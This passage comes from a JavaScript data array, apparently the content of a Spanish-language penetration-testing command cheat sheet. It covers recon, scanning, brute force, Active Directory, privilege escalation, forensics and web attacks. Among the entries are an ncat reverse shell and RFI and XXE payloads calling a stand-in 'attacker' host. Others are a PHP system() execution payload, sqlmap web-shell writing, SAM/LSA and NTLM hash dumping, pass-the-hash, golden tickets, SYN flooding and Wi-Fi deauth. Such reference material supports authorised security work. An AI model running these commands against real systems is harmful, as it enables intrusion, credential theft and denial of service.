      { cmd: "Diseñar plantilla de email", desc: "Crear email template" },
      { cmd: "Monitorear aperturas y clicks", desc: "Ver métricas de campaña" }
    ]
  },
  {
    tool: "Maltego",
    icon: "🔍",
    commands: [
      { cmd: "maltego", desc: "Iniciar Maltego" },
      { cmd: "New Graph", desc: "Crear nuevo grafo de investigación" },
      { cmd: "Transforms > Run All Transforms", desc: "Ejecutar transforms" },
      { cmd: "Seed: DNS Name", desc: "Semilla inicial de investigación" },
      { cmd: "Export graph as image", desc: "Exportar grafo como imagen" }
    ]
  },
  {
    tool: "Recon-ng",
    icon: "🕵️",
    commands: [
      { cmd: "recon-ng", desc: "Iniciar Recon-ng" },
      { cmd: "workspaces create project", desc: "Crear workspace de investigación" },
      { cmd: "modules install harness", desc: "Instalar módulo de recolección" },
      { cmd: "recon/domains-hosts/hackertarget", desc: "Descubrir hosts desde dominio" },
      { cmd: "show hosts", desc: "Mostrar hosts descubiertos" },
      { cmd: "db insert domains", desc: "Insertar dominio objetivo" }
    ]
  },
  {
    tool: "Photon",
    icon: "⚡",
    commands: [
      { cmd: "python3 photon.py -u http://target", desc: "Rastreo web completo" },
      { cmd: "python3 photon.py -u http://target -t 10", desc: "10 threads" },
      { cmd: "python3 photon.py -u http://target --keys", desc: "Extraer API keys" },
      { cmd: "python3 photon.py -u http://target --external", desc: "Incluir dominios externos" }
    ]
  },
  {
    tool: "Sublist3r",
    icon: "🔎",
    commands: [
      { cmd: "sublist3r -d target.com", desc: "Enumerar subdominios" },
      { cmd: "sublist3r -d target.com -b", desc: "Usar todas las fuentes disponibles" },
      { cmd: "sublist3r -d target.com -o subdomains.txt", desc: "Guardar resultados" },
      { cmd: "sublist3r -d target.com -e google,yahoo", desc: "Fuentes específicas" }
    ]
  },
  {
    tool: "Amass",
    icon: "🕸️",
    commands: [
      { cmd: "amass enum -passive -d target.com", desc: "Recon pasivo de subdominios" },
      { cmd: "amass enum -active -d target.com", desc: "Recon activo con DNS" },
      { cmd: "amass enum -brute -d target.com", desc: "Fuerza bruta de subdominios" },
      { cmd: "amass enum -d target.com -o subdomains.txt", desc: "Guardar subdominios encontrados" },
      { cmd: "amass viz -d target.com", desc: "Visualizar mapa de subdominios" }
    ]
  },
  {
    tool: "Shodan",
    icon: "🌍",
    commands: [
      { cmd: "shodan init API_KEY", desc: "Inicializar con API key" },
      { cmd: "shodan search apache country:US", desc: "Buscar dispositivos" },
      { cmd: "shodan host target_ip", desc: "Información de host específico" },
      { cmd: "shodan scan submit target", desc: "Escanear rango de IPs" },
      { cmd: "shodan alerts create", desc: "Crear alerta de monitoreo" }
    ]
  },
  {
    tool: "Recon-ng",
    icon: "🕵️",
    commands: [
      { cmd: "recon-ng", desc: "Iniciar framework de recon" },
      { cmd: "workspaces create pentest", desc: "Crear espacio de trabajo" },
      { cmd: "db insert domains", desc: "Insertar dominio objetivo" },
      { cmd: "modules install recon/domains-hosts/hackertarget", desc: "Instalar módulo de hosts" },
      { cmd: "recon/domains-hosts/hackertarget", desc: "Descubrir hosts" },
      { cmd: "show hosts", desc: "Listar hosts encontrados" }
    ]
  },
  {
    tool: "theHarvester",
    icon: "📧",
    commands: [
      { cmd: "theHarvester -d target.com -b all", desc: "Buscar emails de todas las fuentes" },
      { cmd: "theHarvester -d target.com -b google", desc: "Buscar con Google" },
      { cmd: "theHarvester -d target.com -b linkedin", desc: "Buscar en LinkedIn" },
      { cmd: "theHarvester -d target.com -l 200", desc: "Límite de 200 resultados" },
      { cmd: "theHarvester -d target.com -f report.html", desc: "Guardar en formato HTML" }
    ]
  },
  {
    tool: "SpiderFoot",
    icon: "🕷️",
    commands: [
      { cmd: "spiderfoot -l 127.0.0.1:5001", desc: "Iniciar interfaz web" },
      { cmd: "spiderfoot -s target.com -m sfp_dnsresolve", desc: "Módulo específico de scan" },
      { cmd: "spiderfoot -s target.com -t DOMAIN_NAME", desc: "Scan de dominio completo" }
    ]
  },
  {
    tool: "Nmap Scripts (NSE)",
    icon: "📜",
    commands: [
      { cmd: "nmap --script=http-enum target", desc: "Enumerar directorios y archivos web" },
      { cmd: "nmap --script=http-headers target", desc: "Obtener headers HTTP" },
      { cmd: "nmap --script=ssl-cert target", desc: "Mostrar certificado SSL" },
      { cmd: "nmap --script=ssh-auth-methods target", desc: "Métodos de autenticación SSH" },
      { cmd: "nmap --script=smb-enum-shares target", desc: "Enumerar shares SMB" },
      { cmd: "nmap --script=mysql-info target", desc: "Información de MySQL" },
      { cmd: "nmap --script=http-shellshock --script-args uri=/cgi-bin/test target", desc: "Test Shellshock" },
      { cmd: "nmap --script=banner target", desc: "Capturar banners de servicios" }
    ]
  },
  {
    tool: "Dig",
    icon: "🌐",
    commands: [
      { cmd: "dig target.com", desc: "Consulta DNS básica" },
      { cmd: "dig target.com ANY", desc: "Todos los registros DNS" },
      { cmd: "dig target.com MX", desc: "Registros de correo" },
      { cmd: "dig target.com NS", desc: "Servidores de nombres" },
      { cmd: "dig -x IP", desc: "DNS reverse lookup" },
      { cmd: "dig target.com AXFR", desc: "Transferencia de zona" },
      { cmd: "dig target.com TXT", desc: "Registros TXT (SPF, DMARC)" },
      { cmd: "dig target.com +short", desc: "Respuesta corta" }
    ]
  },
  {
    tool: "Whois",
    icon: "📋",
    commands: [
      { cmd: "whois target.com", desc: "Whois de dominio" },
      { cmd: "whois 192.168.1.1", desc: "Whois de dirección IP" },
      { cmd: "whois -h whois.apnic.net IP", desc: "Whois específico de servidor" }
    ]
  },
  {
    tool: "Traceroute",
    icon: "🛤️",
    commands: [
      { cmd: "traceroute target.com", desc: "Ruta de paquetes con TTL" },
      { cmd: "traceroute -I target.com", desc: "Usar ICMP en vez de UDP" },
      { cmd: "mtr target.com", desc: "Traceroute continuo con estadísticas" }
    ]
  },
  {
    tool: "Hping3",
    icon: "🎯",
    commands: [
      { cmd: "hping3 -S target -p 80", desc: "SYN scan de puerto" },
      { cmd: "hping3 --flood target", desc: "Flood de paquetes SYN" },
      { cmd: "hping3 -1 target", desc: "Ping con ICMP" },
      { cmd: "hping3 -S -p 80 --scan 1-1000 target", desc: "Scan de puertos rápido" },
      { cmd: "hping3 -R target", desc: "Trace route alternativo" }
    ]
  },
  {
    tool: "Scapy",
    icon: "📦",
    commands: [
      { cmd: "scapy", desc: "Iniciar consola Scapy" },
      { cmd: "sr1(IP(dst='target')/ICMP())", desc: "Enviar paquete ICMP y esperar respuesta" },
      { cmd: "sr(IP(dst='target')/TCP(dport=80,flags='S'))", desc: "SYN scan con Scapy" },
      { cmd: "sniff(filter='tcp', count=10)", desc: "Capturar 10 paquetes TCP" },
      { cmd: "send(IP(dst='target')/ICMP())", desc: "Enviar paquete sin esperar respuesta" },
      { cmd: "ls(IP)", desc: "Mostrar campos del paquete IP" }
    ]
  },
  {
    tool: "Tcpdump",
    icon: "📡",
    commands: [
      { cmd: "tcpdump -i eth0", desc: "Capturar tráfico en interfaz" },
      { cmd: "tcpdump -i eth0 port 80", desc: "Capturar tráfico HTTP" },
      { cmd: "tcpdump -i eth0 host target", desc: "Filtrar por host" },
      { cmd: "tcpdump -w capture.pcap", desc: "Guardar en archivo PCAP" },
      { cmd: "tcpdump -r capture.pcap", desc: "Leer archivo PCAP" },
      { cmd: "tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'", desc: "Filtrar SYN packets" }
    ]
  },
  {
    tool: "Ncat",
    icon: "🔗",
    commands: [
      { cmd: "ncat -lvnp 4444", desc: "Escuchar conexiones con Ncat" },
      { cmd: "ncat --ssl target 443", desc: "Conexión SSL encriptada" },
      { cmd: "ncat -e /bin/bash target 4444", desc: "Shell reverso con Ncat" },
      { cmd: "ncat --send-only target 4444 < file.txt", desc: "Enviar archivo" }
    ]
  },
  {
    tool: "Proxychains",
    icon: "🔗",
    commands: [
      { cmd: "proxychains nmap -sT -Pn target", desc: "Nmap a través de proxy chain" },
      { cmd: "proxychains curl http://target", desc: "Request HTTP por proxy" },
      { cmd: "proxychains ssh user@target", desc: "SSH a través de proxy" },
      { cmd: "proxychains hydra -l user -P pass.txt target ssh", desc: "Hydra por proxy" },
      { cmd: "proxychains4 /bin/bash", desc: "Shell completo por proxy" }
    ]
  },
  {
    tool: "Tor",
    icon: "🧅",
    commands: [
      { cmd: "tor", desc: "Iniciar servicio Tor" },
      { cmd: "torsocks curl http://ifconfig.me", desc: "Request vía Tor" },
      { cmd: "torsocks nmap -sT -Pn target", desc: "Nmap vía Tor" },
      { cmd: "tor --SocksPort 9050", desc: "Iniciar Tor en puerto específico" }
    ]
  },
  {
    tool: "Ngrok",
    icon: "🚇",
    commands: [
      { cmd: "ngrok http 80", desc: "Exponer servidor local HTTP" },
      { cmd: "ngrok tcp 4444", desc: "Exponer puerto TCP (para shells)" },
      { cmd: "ngrok http https://localhost:443", desc: "Túnel HTTPS local" },
      { cmd: "ngrok status", desc: "Estado de túneles activos" }
    ]
  },
  {
    tool: "Metasploit Framework",
    icon: "⚡",
    commands: [
      { cmd: "msfdb init", desc: "Inicializar base de datos" },
      { cmd: "msfvenom -l payloads", desc: "Listar todos los payloads disponibles" },
      { cmd: "msfvenom -l encoders", desc: "Listar todos los encoders" },
      { cmd: "db_nmap -sV target", desc: "Nmap integrado con Metasploit" },
      { cmd: "hosts", desc: "Listar hosts en la base de datos" },
      { cmd: "services", desc: "Listar servicios descubiertos" },
      { cmd: "vulns", desc: "Listar vulnerabilidades encontradas" }
    ]
  },
  {
    tool: "SearchSploit",
    icon: "🔍",
    commands: [
      { cmd: "searchsploit apache 2.4", desc: "Buscar exploits para Apache 2.4" },
      { cmd: "searchsploit -x 12345", desc: "Ver código del exploit" },
      { cmd: "searchsploit -m 12345", desc: "Copiar exploit a directorio actual" },
      { cmd: "searchsploit -u", desc: "Actualizar base de datos de exploits" },
      { cmd: "searchsploit --cve 2021-44228", desc: "Buscar por CVE específico" }
    ]
  },
  {
    tool: "Nmap Scripts (NSE) Avanzados",
    icon: "📜",
    commands: [
      { cmd: "nmap --script=http-shellshock --script-args uri=/cgi-bin/admin target", desc: "Test Shellshock avanzado" },
      { cmd: "nmap --script=smb-vuln-ms17-010 target", desc: "Test EternalBlue" },
      { cmd: "nmap --script=mysql-vuln-cve2012-2122 target", desc: "Test vulnerabilidad MySQL" },
      { cmd: "nmap --script=ssl-heartbleed target", desc: "Test Heartbleed" },
      { cmd: "nmap --script=http-sql-injection target", desc: "Test SQL injection" },
      { cmd: "nmap --script=ftp-anon target", desc: "Test acceso anónimo FTP" }
    ]
  },
  {
    tool: "Hydra Avanzado",
    icon: "🐍",
    commands: [
      { cmd: "hydra -l admin -P rockyou.txt http-get-form \"http://target/login.php:user=admin&pass=^PASS^:F=incorrect\"", desc: "HTTP GET form brute force" },
      { cmd: "hydra -l admin -P rockyou.txt http-post-form \"http://target/login:username=^USER^&password=^PASS^:F=invalid\"", desc: "HTTP POST form brute force" },
      { cmd: "hydra -C defaults.txt ssh://target", desc: "Usar combos usuario:password" },
      { cmd: "hydra -l admin -P passwords.txt -t 1 rdp://target", desc: "Fuerza bruta RDP" },
      { cmd: "hydra -L users.txt -P passwords.txt smtp-enum://target", desc: "Enumeración SMTP" }
    ]
  },
  {
    tool: "SQLmap Avanzado",
    icon: "🗄️",
    commands: [
      { cmd: "sqlmap -r request.txt --batch --level=5 --risk=3 --threads=4", desc: "Ataque completo con múltiples threads" },
      { cmd: "sqlmap -u 'http://target/?id=1' --os-cmd='id'", desc: "Ejecutar comandos del SO" },
      { cmd: "sqlmap -u 'http://target/?id=1' --file-read='/etc/passwd'", desc: "Leer archivos del servidor" },
      { cmd: "sqlmap -u 'http://target/?id=1' --file-write=shell.php --file-dest=/var/www/html/", desc: "Escribir archivo en servidor" },
      { cmd: "sqlmap -u 'http://target/?id=1' --tamper=space2comment,between", desc: "Bypass de WAF" }
    ]
  },
  {
    tool: "WPScan Avanzado",
    icon: "📰",
    commands: [
      { cmd: "wpscan --url http://target --enumerate u,vp,vt", desc: "Enumerar usuarios, plugins y temas vulnerables" },
      { cmd: "wpscan --url http://target --passwords rockyou.txt --usernames admin", desc: "Ataque de credenciales" },
      { cmd: "wpscan --url http://target --detection-mode aggressive", desc: "Detección agresiva" },
      { cmd: "wpscan --url http://target --stealthy", desc: "Modo stealth" },
      { cmd: "wpscan --url http://target --wp-content-dir custom", desc: "Directorio WP personalizado" }
    ]
  },
  {
    tool: "Burp Suite Avanzado",
    icon: "🕷️",
    commands: [
      { cmd: "Proxy > HTTP history", desc: "Historial completo de peticiones HTTP" },
      { cmd: "Intruder > Positions > Add §", desc: "Marcar posiciones de fuzzing" },
      { cmd: "Intruder > Payloads > Payload type: Runtime file", desc: "Cargar payload desde archivo" },
      { cmd: "Repeater > Render", desc: "Renderizar respuesta HTML" },
      { cmd: "Logger > Filter > By MIME type", desc: "Filtrar por tipo MIME" }
    ]
  },
  {
    tool: "Volatility Avanzado",
    icon: "🧠",
    commands: [
      { cmd: "volatility -f mem.dmp --profile=Win7SP1x64 malfind", desc: "Detectar procesos maliciosos" },
      { cmd: "volatility -f mem.dmp --profile=Win7SP1x64 envars", desc: "Variables de entorno de procesos" },
      { cmd: "volatility -f mem.dmp --profile=Win7SP1x64 handles", desc: "Handles abiertos por procesos" },
      { cmd: "volatility -f mem.dmp --profile=Win7SP1x64 callbacks", desc: "Callbacks del kernel" },
      { cmd: "volatility -f mem.dmp --profile=Win7SP1x64 svcscan", desc: "Servicios instalados" }
    ]
  },
  {
    tool: "Feroxbuster Avanzado",
    icon: "🦊",
    commands: [
      { cmd: "feroxbuster -u http://target --auto-balance", desc: "Auto balance de threads" },
      { cmd: "feroxbuster -u http://target -s 403 --redirects", desc: "Seguir redirecciones 403" },
      { cmd: "feroxbuster -u http://target --scan-limit 3", desc: "Limitar escaneos simultáneos" },
      { cmd: "feroxbuster -u http://target --silent", desc: "Solo resultados encontrados" },
      { cmd: "feroxbuster -u http://target -H 'Cookie: session=abc'", desc: "Header personalizado con cookie" }
    ]
  },
  {
    tool: "CrackMapExec Avanzado",
    icon: "🗺️",
    commands: [
      { cmd: "crackmapexec smb 192.168.1.0/24 --shares -u user -p pass", desc: "Enumerar shares en toda la red" },
      { cmd: "crackmapexec smb target -u user -p pass --sam", desc: "Dump SAM hashes" },
      { cmd: "crackmapexec smb target -u user -p pass --lsa", desc: "Dump LSA secrets" },
      { cmd: "crackmapexec smb target -u user -p pass -M spiderplus", desc: "Spider todos los shares" },
      { cmd: "crackmapexec smb target --local-auth -u admin -p pass", desc: "Autenticación local" }
    ]
  },
  {
    tool: "BloodHound Avanzado",
    icon: "🩸",
    commands: [
      { cmd: "bloodhound-python -u user -p pass -d domain -c DCOnly --zip", desc: "Colectar y comprimir datos" },
      { cmd: "sharpHound -c Session", desc: "Colectar sesiones activas" },
      { cmd: "sharpHound --Stealth", desc: "Colectar de forma stealth" },
      { cmd: "Query: Find all Domain Admins", desc: "Consultar Domain Admins en GUI" },
      { cmd: "Query: Find Shortest Path to Domain Admin", desc: "Ruta más corta a DA" }
    ]
  },
  {
    tool: "Impacket Avanzado",
    icon: "🧰",
    commands: [
      { cmd: "impacket-smbexec -hashes aad3b...:b18a... domain/admin@target", desc: "Pass the hash con SMB" },
      { cmd: "impacket-psexec -hashes aad3b...:b18a... domain/admin@target", desc: "Pass the hash con PsExec" },
      { cmd: "impacket-secretsdump domain/admin:password@target -just-dc-ntlm", desc: "Solo NTLM hashes del DC" },
      { cmd: "impacket-ticketsConverter ticket.kirbi ticket.ccache", desc: "Convertir formato de tickets" },
      { cmd: "impacket-ticketer -nthash hash -domain-sid SIDs -domain domain admin", desc: "Golden ticket con NTLM hash" }
    ]
  },
  {
    tool: "Linux Privesc",
    icon: "⬆️",
    commands: [
      { cmd: "find / -perm -4000 -type f 2>/dev/null", desc: "Archivos SUID para privilege escalation" },
      { cmd: "find / -writable -type f -executable 2>/dev/null", desc: "Archivos ejecutables escribibles" },
      { cmd: "cat /etc/ld.so.preload 2>/dev/null", desc: "Verificar preload ( LD_PRELOAD hijacking)" },
      { cmd: "find / -name '*.conf' -writable 2>/dev/null", desc: "Archivos de configuración escribibles" },
      { cmd: "grep -r 'password' /etc/*.conf 2>/dev/null", desc: "Passwords en archivos de configuración" },
      { cmd: "ls -la /etc/shadow", desc: "Verificar permisos shadow" },
      { cmd: "getcap -r / 2>/dev/null", desc: "Capabilities de archivos" },
      { cmd: "systemctl list-units --type=service --state=running", desc: "Servicios en ejecución" },
      { cmd: "find / -name '*.log' -writable 2>/dev/null", desc: "Logs escribibles para inyectar código" }
    ]
  },
  {
    tool: "Windows Privesc",
    icon: "⬆️",
    commands: [
      { cmd: "whoami /all", desc: "Información completa del usuario" },
      { cmd: "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"", desc: "Versión del SO" },
      { cmd: "wmic service list brief", desc: "Servicios instalados" },
      { cmd: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", desc: "Verificar AlwaysInstallElevated" },
      { cmd: "netsh advfirewall show allprofiles", desc: "Configuración del firewall" },
      { cmd: "wmic product get name,version,vendor", desc: "Software instalado" },
      { cmd: "schtasks /query /fo LIST /v", desc: "Tareas programadas detalladas" },
      { cmd: "accesschk.exe /accepteula -wvu Users", desc: "Permisos de usuarios con AccessChk" }
    ]
  },
  {
    tool: "ExifTool",
    icon: "📷",
    commands: [
      { cmd: "exiftool image.jpg", desc: "Ver metadatos EXIF completos" },
      { cmd: "exiftool -gps:all image.jpg", desc: "Extraer datos GPS" },
      { cmd: "exiftool -Author image.jpg", desc: "Ver autor del archivo" },
      { cmd: "exiftool -AllDates image.jpg", desc: "Todas las fechas" },
      { cmd: "exiftool -Comment image.jpg", desc: "Comentarios ocultos" }
    ]
  },
  {
    tool: "Steghide",
    icon: "🖼️",
    commands: [
      { cmd: "steghide info image.jpg", desc: "Información sobre esteganografía" },
      { cmd: "steghide extract -sf image.jpg", desc: "Extraer datos ocultos" },
      { cmd: "steghide embed -cf image.jpg -ef secret.txt", desc: "Ocultar archivo en imagen" },
      { cmd: "steghide extract -sf image.jpg -p password", desc: "Extraer con contraseña" },
      { cmd: "steghide --info image.jpg", desc: "Detalles de archivos embebidos" }
    ]
  },
  {
    tool: "Zsteg",
    icon: "📊",
    commands: [
      { cmd: "zsteg image.png", desc: "Análisis de esteganografía en PNG" },
      { cmd: "zsteg -a image.png", desc: "Análisis completo de todos los métodos" },
      { cmd: "zsteg -E 'b1,rgb,lsb' image.png", desc: "Extraer datos con método específico" }
    ]
  },
  {
    tool: "Stegseek",
    icon: "🔓",
    commands: [
      { cmd: "stegseek image.jpg rockyou.txt", desc: "Crackear esteganografía con diccionario" },
      { cmd: "stegseek image.jpg", desc: "Crackear sin diccionario (default)" },
      { cmd: "stegseek --seed image.jpg", desc: "Modo seed para brute force" }
    ]
  },
  {
    tool: "Nikto Avanzado",
    icon: "🕸️",
    commands: [
      { cmd: "nikto -h target -Tuning 9", desc: "Test de misconfiguration" },
      { cmd: "nikto -h target -Tuning 1", desc: "Test de archivos inseguros" },
      { cmd: "nikto -h target -Tuning 6", desc: "Test de SQL injection" },
      { cmd: "nikto -h target -Display 3", desc: "Mostrar redirectiones y cookies" },
      { cmd: "nikto -h target -evasion 67", desc: "Evasión con encoding URI" }
    ]
  },
  {
    tool: "Dirb",
    icon: "📁",
    commands: [
      { cmd: "dirb http://target", desc: "Brute force de directorios básico" },
      { cmd: "dirb http://target wordlist.txt", desc: "Con wordlist específica" },
      { cmd: "dirb http://target -S", desc: "Modo silencioso" },
      { cmd: "dirb http://target -r 3", desc: "Retroceder 3 directorios" },
      { cmd: "dirb http://target -t 10", desc: "10 threads" },
      { cmd: "dirb http://target -o results.txt", desc: "Guardar resultados" }
    ]
  },
  {
    tool: "Wfuzz",
    icon: "💣",
    commands: [
      { cmd: "wfuzz -c -z file,wordlist.txt http://target/FUZZ", desc: "Fuzzing de directorios" },
      { cmd: "wfuzz -c -z file,wordlist.txt -d 'user=admin&pass=FUZZ' http://target/login", desc: "Fuzzing de formulario" },
      { cmd: "wfuzz -c -z range,1-1000 http://target/?id=FUZZ", desc: "Fuzzing numérico" },
      { cmd: "wfuzz --hc 404 -c -z file,wordlist.txt http://target/FUZZ", desc: "Ocultar respuestas 404" },
      { cmd: "wfuzz -c -z file,wordlist.txt -H 'Cookie: session=abc' http://target/FUZZ", desc: "Con cookie personalizada" }
    ]
  },
  {
    tool: "ffuf",
    icon: "⚡",
    commands: [
      { cmd: "ffuf -u http://target/FUZZ -w wordlist.txt", desc: "Fuzzing de directorios" },
      { cmd: "ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301", desc: "Filtrar por códigos" },
      { cmd: "ffuf -u http://target -X POST -d 'user=admin&pass=FUZZ' -w wordlist.txt", desc: "POST fuzzing" },
      { cmd: "ffuf -u http://target/FUZZ -w wordlist.txt -fs 4242", desc: "Filtrar por tamaño de respuesta" },
      { cmd: "ffuf -u http://target/FUZZ -w wordlist.txt -H 'Authorization: Basic FUZZ'", desc: "Brute force auth headers" },
      { cmd: "ffuf -u http://target/FUZZ -w wordlist.txt -recursion -recursion-depth 2", desc: "Fuzzing recursivo" }
    ]
  },
  {
    tool: "LFI/RFI Tools",
    icon: "📄",
    commands: [
      { cmd: "curl 'http://target/page.php?file=../../../../etc/passwd'", desc: "LFI básico para Linux" },
      { cmd: "curl 'http://target/page.php?file=....//....//....//etc/passwd'", desc: "LFI bypass con doble punto" },
      { cmd: "curl 'http://target/page.php?file=php://filter/convert.base64-encode/resource=config.php'", desc: "LFI con PHP wrapper" },
      { cmd: "curl 'http://target/page.php?file=http://attacker/shell.txt?\\'", desc: "RFI a servidor atacante" },
      { cmd: "curl 'http://target/page.php?file=php://input' -d '<?php system($_GET[\"cmd\"]); ?>'", desc: "PHP input wrapper para code execution" }
    ]
  },
  {
    tool: "XSS Tools",
    icon: "💉",
    commands: [
      { cmd: "<script>alert('XSS')</script>", desc: "XSS básico de prueba" },
      { cmd: "<img src=x onerror=alert('XSS')>", desc: "XSS con imagen" },
      { cmd: "<svg onload=alert('XSS')>", desc: "XSS con SVG" },
      { cmd: "javascript:alert('XSS')", desc: "XSS en URL (javascript:)" },
      { cmd: "'-alert(1)-'", desc: "XSS en contexto de string" },
      { cmd: "\"><script>alert('XSS')</script>", desc: "XSS rompiendo attribute" }
    ]
  },
  {
    tool: "XXE Tools",
    icon: "📰",
    commands: [
      { cmd: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", desc: "XXE básico para leer archivos" },
      { cmd: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker/\">]>", desc: "XXE para SSRF" },
      { cmd: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]>", desc: "XXE con PHP wrapper" },
      { cmd: "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker/xxe.xml\">%xxe;]>", desc: "XXE externo" }
    ]
  },
  {
    tool: "SSRF Tools",
    icon: "🔀",
    commands: [
      { cmd: "curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/'", desc: "SSRF a AWS metadata" },
      { cmd: "curl 'http://target/proxy?url=http://localhost:8080/admin'", desc: "SSRF a servicios internos" },
      { cmd: "curl 'http://target/load?url=file:///etc/passwd'", desc: "SSRF con file:// scheme" },
      { cmd: "curl 'http://target/load?url=gopher://localhost:6379/_SET%20pwned%20true'", desc: "SSRF con gopher:// a Redis" }
    ]
  },
  {
    tool: "Deserialization",
    icon: "📦",
    commands: [
      { cmd: "php -r 'echo serialize(array(\"admin\"=>true));'", desc: "Serializar objeto PHP" },
      { cmd: "php -r 'var_dump(unserialize(\"a:1:{s:5:\\\"admin\\\";b:1;}\"));'", desc: "Deserializar objeto PHP" },
      { cmd: "ysoserial.jar CommonsCollections1 'touch /tmp/pwned'", desc: "Generar payload Java deserialization" },
      { cmd: "curl -X POST -d 'data=serialized_object' http://target", desc: "Enviar objeto serializado malicioso" }
    ]
  },
  {
    tool: "Cryptography",
    icon: "🔐",
    commands: [
      { cmd: "echo -n 'text' | md5sum", desc: "Calcular MD5" },
      { cmd: "echo -n 'text' | sha256sum", desc: "Calcular SHA-256" },
      { cmd: "echo -n 'text' | base64", desc: "Codificar en Base64" },
      { cmd: "echo 'dGV4dA==' | base64 -d", desc: "Decodificar Base64" },
      { cmd: "openssl enc -aes-256-cbc -salt -in plain.txt -out enc.txt", desc: "Cifrar con AES" },
      { cmd: "openssl dgst -sha256 hash.txt", desc: "Hash SHA-256 con OpenSSL" }
    ]
  },
  {
    tool: "Forensics Avanzado",
    icon: "🔬",
    commands: [
      { cmd: "strings binary | grep -i pass", desc: "Buscar strings relacionados con passwords" },
      { cmd: "file mystery_file", desc: "Identificar tipo real de archivo" },
      { cmd: "xxd file | head -20", desc: "Hex dump del archivo" },
      { cmd: "binwalk -e firmware.bin", desc: "Extraer sistema de archivos de firmware" },
      { cmd: "autopsy image.dd", desc: "Análisis forense con Autopsy" },
      { cmd: "volatility -f mem.dmp imageinfo", desc: "Identificar perfil de memoria" },
      { cmd: "foremost -i disk.img -o output", desc: "Recuperar archivos de imagen de disco" },
      { cmd: "scalpel -o output disk.img", desc: "File carving con Scalpel" }
    ]
  },
  {
    tool: "Password Cracking",
    icon: "🔑",
    commands: [
      { cmd: "john --wordlist=rockyou.txt hashes.txt", desc: "Crackear con John the Ripper" },
      { cmd: "hashcat -m 1000 hashes.txt rockyou.txt", desc: "Crackear NTLM con Hashcat" },
      { cmd: "hashcat -m 0 hashes.txt rockyou.txt -r best64.rule", desc: "Crackear MD5 con reglas" },
      { cmd: "john --single hashes.txt", desc: "Ataque single crack" },
      { cmd: "hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a", desc: "Brute force 6 caracteres" }
    ]
  },
  {
    tool: "Wireless",
    icon: "📶",
    commands: [
      { cmd: "airmon-ng start wlan0", desc: "Modo monitor" },
      { cmd: "airodump-ng wlan0mon", desc: "Escaneo de redes" },
      { cmd: "aireplay-ng -0 5 -a BSSID wlan0mon", desc: "Deauth para handshake" },
      { cmd: "aircrack-ng -w rockyou.txt capture.cap", desc: "Crackear WPA" },
      { cmd: "reaver -i wlan0mon -b BSSID -vv", desc: "Ataque WPS con Reaver" }
    ]
  },
  {
    tool: "Active Directory",
    icon: "🏢",
    commands: [
      { cmd: "ldapsearch -x -h dc.target.com -b 'DC=target,DC=com'", desc: "LDAP search en AD" },
      { cmd: "enum4linux -a dc.target.com", desc: "Enumeración completa AD" },
      { cmd: "crackmapexec ldap dc.target.com -u user -p pass --users", desc: "Listar usuarios AD" },
      { cmd: "bloodhound-python -u user -p pass -d target.com -c All", desc: "BloodHound desde Linux" },
      { cmd: "GetUserSPNs.py target.com/user:pass -request", desc: "Kerberoasting con Impacket" }
    ]
  },
  {
    tool: "Masscan",
    icon: "⚡",
    commands: [
      { cmd: "masscan -p1-65535 192.168.1.0/24 --rate=10000", desc: "Escaneo TCP de todos los puertos a 10.000 paquetes por segundo" },
      { cmd: "masscan -p80,443,8080 10.0.0.0/8 --rate=50000 -oX results.xml", desc: "Escanear puertos web en rango clase A y exportar a XML" },
      { cmd: "masscan --top-ports 100 192.168.1.1 --banners", desc: "Capturar banners de los 100 puertos más frecuentes" },
      { cmd: "masscan 0.0.0.0/0 -p80 --rate 1000000 --exclude 255.255.255.255", desc: "Escaneo a escala de Internet especificando exclusión" },
      { cmd: "masscan -p445 192.168.1.0/24 --adapter-ip 192.168.1.50 --adapter-port 40000", desc: "Especificar interfaz de salida e IP/puerto de origen" }
    ]
  },
  {
    tool: "Amass",
    icon: "🌐",
    commands: [
      { cmd: "amass enum -d target.com", desc: "Enumeración pasiva y activa de subdominios" },
      { cmd: "amass enum -passive -d target.com -src", desc: "Enumeración estrictamente pasiva mostrando las fuentes de datos" },
      { cmd: "amass enum -active -d target.com -p 80,443,8080 -brute -w subs.txt", desc: "Enumeración activa con fuerza bruta de subdominios" },
      { cmd: "amass intel -org \"Target Organization\"", desc: "Búsqueda de ASN y rangos IP asociados a la organización" },
      { cmd: "amass intel -d target.com -whois", desc: "Descubrimiento de nuevos dominios mediante correlación Whois" },
      { cmd: "amass db -d target.com -show", desc: "Consultar la base de datos de hallazgos acumulados" },
      { cmd: "amass viz -d target.com -d3", desc: "Generar archivo de visualización de relaciones en formato D3.js" }
    ]
  },
  {
    tool: "Subfinder",
    icon: "🔎",
    commands: [
      { cmd: "subfinder -d target.com", desc: "Descubrimiento rápido y pasivo de subdominios" },
      { cmd: "subfinder -dL domains.txt -o all_subdomains.txt", desc: "Enumerar subdominios para múltiples targets desde un archivo" },
      { cmd: "subfinder -d target.com -all -recursive -t 100", desc: "Usar todas las fuentes recursivamente con 100 hilos concurrentes" },
      { cmd: "subfinder -d target.com -silent | httpx -title -status-code", desc: "Pipeline directo conectando subfinder con httpx para validar servicios" }
    ]
  },
  {
    tool: "TheHarvester",
    icon: "🦅",
    commands: [
      { cmd: "theHarvester -d target.com -b all", desc: "Buscar en todos los motores de búsqueda públicos (Google, Bing, Yahoo, etc.)" },
      { cmd: "theHarvester -d target.com -b linkedin -l 500", desc: "Recolectar nombres de empleados y perfiles públicos de LinkedIn" },
      { cmd: "theHarvester -d target.com -b duckduckgo,crtsh,virustotal -f report.json", desc: "Consultas multi-fuente y guardado estructurado en JSON" },
      { cmd: "theHarvester -d target.com -b all --dns-lookup -v", desc: "Resolver DNS para todos los dominios recolectados en modo verbose" }
    ]
  },
  {
    tool: "Ffuf (Fuzzing Extendido)",
    icon: "🚀",
    commands: [
